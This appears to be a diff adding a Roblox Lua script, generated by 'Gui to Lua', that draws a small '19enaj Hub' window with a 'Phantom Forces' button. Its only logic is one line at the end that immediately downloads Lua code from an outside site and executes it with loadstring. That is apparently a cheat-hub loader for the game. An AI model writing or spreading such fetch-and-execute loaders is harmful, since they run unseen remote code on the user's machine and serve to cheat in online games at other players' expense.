@@ -1,0 +1,57 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local PhantomForces = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(76, 0, 1)
+main.Position = UDim2.new(0.296983749, 0, 0.365656555, 0)
+main.Size = UDim2.new(0, 290, 0, 205)
+main.Active = true 
+main.Draggable = true
+
+TextLabel.Parent = main
+TextLabel.BackgroundColor3 = Color3.fromRGB(157, 0, 2)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Size = UDim2.new(0, 290, 0, 29)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "19enaj Hub a Hoşgeldin!"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 30.000
+
+ScrollingFrame.Parent = main
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.Position = UDim2.new(0, 0, 0.141463414, 0)
+ScrollingFrame.Size = UDim2.new(0, 290, 0, 176)
+
+PhantomForces.Name = "Phantom Forces"
+PhantomForces.Parent = main
+PhantomForces.BackgroundColor3 = Color3.fromRGB(199, 0, 3)
+PhantomForces.Position = UDim2.new(0, 0, 0.141463414, 0)
+PhantomForces.Size = UDim2.new(0, 276, 0, 50)
+PhantomForces.Font = Enum.Font.SourceSans
+PhantomForces.Text = "Phantom Forces"
+PhantomForces.TextColor3 = Color3.fromRGB(0, 0, 0)
+PhantomForces.TextSize = 30.000
+
+-- Scripts:
+
+local function FSFSD_fake_script() -- PhantomForces.activate 
+	local script = Instance.new('LocalScript', PhantomForces)
+
+	loadstring(game:HttpGet("https://ducksite.xyz/ceri/main.lua"))()
+end
+coroutine.wrap(FSFSD_fake_script)()
